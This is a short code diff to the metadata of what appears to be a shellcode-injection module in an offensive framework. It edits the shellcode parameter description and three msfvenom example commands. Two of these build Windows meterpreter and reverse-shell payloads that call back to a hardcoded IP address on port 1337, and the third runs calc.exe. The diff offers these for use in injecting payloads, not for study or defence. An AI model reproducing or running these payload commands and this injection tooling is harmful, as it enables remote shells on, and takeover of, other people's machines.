@@ -22,15 +22,15 @@ def get_info():
                 "required": True
             },
             "shellcode": {
-                "description": "The shellcode to inject, either as raw bytes, hex string, or msfvenom base64 output",
+                "description": "The shellcode to inject as msfvenom base64 output",
                 "required": True
             }
         },
         "notes": {
             "msfvenom_examples": [
-                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64",
-                "msfvenom -p windows/x64/exec CMD='calc.exe' -f raw | base64",
-                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64"
+                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64 -w 0",
+                "msfvenom -p windows/x64/exec CMD='calc.exe' -f raw | base64 -w 0",
+                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw | base64 -w 0"
             ]
         }
     }
